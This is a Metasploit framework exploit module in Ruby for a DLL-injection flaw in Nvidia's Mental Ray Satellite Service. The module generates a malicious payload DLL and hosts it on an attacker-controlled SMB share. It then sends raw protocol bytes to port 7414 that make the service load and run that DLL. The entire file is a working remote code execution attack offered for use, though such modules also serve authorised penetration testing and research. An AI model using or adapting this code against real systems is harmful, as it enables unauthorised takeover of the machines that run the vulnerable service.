##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::Remote::SMBServer
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'Nvidia Mental Ray Satellite Service Arbitrary DLL Injection',
      'Description'	=> %q{
          Tested on Win7 x64 with http://images.autodesk.com/adsk/files/Maya_mrsat3.11.1_Win_64bit.exe
      },
      'License'		=> MSF_LICENSE,
      'Author'		=>
        [
          'Luigi Auriemma', # Discovery
          'Donato Ferrante', # Discovery
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' # Metasploit Module
        ],
      'References'	=>
        [
          [ 'URL', 'http://revuln.com/files/ReVuln_NVIDIA_mental_ray.pdf' ]
        ],
      'Platform'	=> 'win',
      'Targets'		 =>
        [
          [ 'Windows x64',
            {
              'Arch'   	=>	ARCH_X86_64
            }
          ],
        ],
      'Privileged'	 => true,
      'DisclosureDate' => 'Dec 10 2013',
      'DefaultTarget'	 => 0))

    register_options([
                         Opt::RPORT(7414),
                         OptInt.new('LISTEN_PORT', [ true, 'The port to catch the return connection on', 7514]),
                         OptString.new('UNCPATH', [ false, 'Override the UNC path to use (Ex: \\\\192.168.1.1\\share\\exploit.dll)' ])
                     ], self.class)

  end

  def primer
    send_exploit
  end

  def exploit
    if (datastore['UNCPATH'])
      @unc = datastore['UNCPATH']
      print_status("Remember to share the malicious DLL payload as #{@unc}")
    else
      print_status("Generating our malicious binary...")
      @payload = generate_payload_dll

      my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
      @share = rand_text_alpha(5 + rand(5))
      @target_file = "#{rand_text_alpha(5 + rand(5))}.dll"
      @hi, @lo = UTILS.time_unix_to_smb(Time.now.to_i)
      @unc = "\\\\#{my_host}\\#{@share}\\#{@target_file}"
    end

    if not datastore['UNCPATH']
      print_status("Ready to deliver your payload on #{@unc}")
      super
    end
  end

  def create_listen_port
    port = datastore['LISTEN_PORT']

    comm = datastore['ListenerComm']
    if comm == "local"
      comm = ::Rex::Socket::Comm::Local
    else
      comm = nil
    end

    @listener = Rex::Socket::TcpServer.create(
        'LocalHost' => datastore['SRVHOST'],
        'LocalPort' => port,
        'Comm'      => comm,
        'Context'   => {
            'Msf'        => framework,
            'MsfExploit' => self,
        }
    )

    # Register callbacks
    @listener.on_client_connect_proc = Proc.new { |cli|
      add_socket(cli)
      begin
        print_status("#{cli.peerhost.ljust(16)} #{self.shortname} - Connected to Listener")
        sleep(10)
      ensure
        @rtmp_listener.close_client(cli)
        remove_socket(cli)
      end
    }

    @listener.start
    vprint_status("Started listening on #{port}")
  end

  def send_exploit
    # No idea what most of this hello is...
    hello = "6c72696d3030303030203030303031203136333932203037353134203030303031203039303936203030303030207261796d7"
    hello << "36734302d332e31312e312e345f5f5f5f5f5f5f5f5f5f5f5f0020007c5241593331317c53554231000100000000e90300000"
    hello << "0000000ffffffffffffffff1807000000000000dc10d7fdfe0700003018a40500000000e73654fffe070000c0afcd0000000"
    hello << "000ffffffffffffffffffffffffffffffff18070000000000007014a70100000000763754fffe0700000000000000000000f"
    hello << "035ae01000000003036ae0100000000da2152fffe0700003036ae0100000000a33754fffe070000000000000000000000000"
    hello << "00000000000ffffffffffffffffffffffffffffffff3036ae0100000000c40e53fffe0700007014a70100000000180700000"
    hello << "0000000000000000000000000000000000000000000000000000000020000000000000001000000000000005035440400000"
    hello << "0008013a7010000000090b3cd00000000001807000000000000b929d80300000000000000000000000018070000000000009"
    hello << "0b3cd000000000010cda701000000000000000000000000010100000000000000b3cd0000000000060000000000000066000"
    hello << "200000000000000020000000a0008000000a01a0fe73d00cf118ca300804034ae01000000000100000000000000000000000"
    hello << "0000000030000000a000000"

    hello = Rex::Text.hex_to_raw(hello)

    # Start of command - again no idea
    load_dll =  Rex::Text.hex_to_raw("4ed32cb1740500000000000001130013")
    # Length of path string including null byte
    load_dll << [@unc.length+1].pack('V')
    # Data type? Not sure
    load_dll << [2].pack('V')
    # Assembly Load? Not sure
    load_dll << "AL"
    load_dll << @unc << "\x00"
    # Some padding at the end... Could be randomized perhaps?
    load_dll << "\x00" * (1386 - @unc.length)

    # We have to start a second listening port so we just use Ruby Sockets for this at the moment...
    # modules/exploits/winndows/browser/adobe_flash_rtmp maybe have a better way of doing this
    # although we dont actually care about handling client connections it appears as long as the
    # service can make a connection its happy and will move onto the DLL loading
    create_listen_port
    vprint_status("Connecting to target and sending commands")
    connect
    sock.put(hello)
    sock.put(load_dll)
    print_status("Command sent, please be patient for WebDAV connection...")
  end

  def cleanup
    super
    return if not @listener

    begin
      @listener.deref if @listener.kind_of?(Rex::Service)
      if @listener.kind_of?(Rex::Socket)
        @listener.close
        @listener.stop
      end
      @listener = nil
    rescue ::Exception
    end
  end
end

